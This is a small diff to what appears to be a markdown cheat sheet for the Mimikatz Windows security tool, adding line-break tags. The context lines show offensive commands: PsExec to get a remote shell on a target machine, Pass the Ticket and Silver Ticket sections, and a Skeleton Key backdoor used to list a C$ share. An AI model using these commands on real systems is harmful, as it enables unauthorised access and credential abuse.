@@ -65,7 +65,7 @@ description: "A tool to play with Windows security, written in C."
  > List files in c drive of the machine.
 
  > 
- > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**
+ > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**</br>
  > Get a shell on the machine.
 
 ## Pass the Ticket
@@ -106,5 +106,5 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
  > Create a backdoor with credentials "mimikatz". 
 
  > 
- > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**
+ > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**</br>
  > List C: drive content using Skleton Key backdoor. 
